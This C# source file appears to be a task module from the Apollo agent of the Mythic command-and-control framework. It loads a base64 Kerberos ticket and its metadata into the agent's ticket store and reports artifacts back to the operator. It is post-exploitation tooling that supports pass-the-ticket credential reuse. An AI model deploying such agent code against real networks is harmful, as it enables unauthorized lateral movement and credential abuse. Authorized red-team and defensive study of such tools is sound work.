#define COMMAND_NAME_UPPER

#if DEBUG
#define TICKET_STORE_ADD
#endif

#if TICKET_STORE_ADD

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Features.KerberosTickets;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;

namespace Tasks;

public class ticket_store_add : Tasking
{
    
    [DataContract]
    internal struct TicketStoreAddParameters
    {
        [DataMember(Name = "base64ticket")]
        internal string base64Ticket;
        [DataMember(Name = "ClientName")]
        public string ClientName;
        [DataMember(Name = "ClientRealm")]
        public string ClientRealm;
        [DataMember(Name = "ServerName")]
        public string ServerName;
        [DataMember(Name = "ServerRealm")]
        public string ServerRealm;
        [DataMember(Name = "StartTime")]
        public int StartTime;
        [DataMember(Name = "EndTime")]
        public int EndTime;
        [DataMember(Name = "RenewTime")]
        public int RenewTime;
        [DataMember(Name = "EncryptionType")]
        public int EncryptionType;
        [DataMember(Name = "TicketFlags")]
        public int TicketFlags;
    }

    public ticket_store_add(IAgent agent, MythicTask data) : base(agent, data)
    { }
    public override void Start()
    {
        MythicTaskResponse resp = new MythicTaskResponse { };
        try
        {
            TicketStoreAddParameters parameters = _jsonSerializer.Deserialize<TicketStoreAddParameters>(_data.Parameters);
            string base64Ticket = parameters.base64Ticket;
            byte[] ticketBytes = Convert.FromBase64String(base64Ticket);
            KerberosTicket ticket = new KerberosTicket();
            ticket.ClientRealm = parameters.ClientRealm;
            ticket.ClientName = parameters.ClientName;
            ticket.ServerName = parameters.ServerName;
            ticket.ServerRealm = parameters.ServerRealm;
            ticket.StartTime = new DateTime(1970,1,1,0,0,0).AddSeconds(parameters.StartTime);
            ticket.EndTime = new DateTime(1970,1,1,0,0,0).AddSeconds(parameters.EndTime);
            ticket.RenewTime = new DateTime(1970,1,1,0,0,0).AddSeconds(parameters.RenewTime);
            ticket.TicketFlags = (KerbTicketFlags)parameters.TicketFlags;
            ticket.EncryptionType = (KerbEncType)parameters.EncryptionType;
            ticket.Kirbi = ticketBytes;
            _agent.GetTicketManager().AddTicketToTicketStore(new KerberosTicketStoreDTO(ticket));
            resp = CreateTaskResponse($"Added Ticket to Ticket Store", true);
        }
        catch (Exception e)
        {
            resp = CreateTaskResponse($"Failed to add ticket into store: {e.Message}", true, "error");
        }
        //get and send back any artifacts
        IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
        var artifactResp = CreateArtifactTaskResponse(artifacts);
        _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
        
        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
    }
}
#endif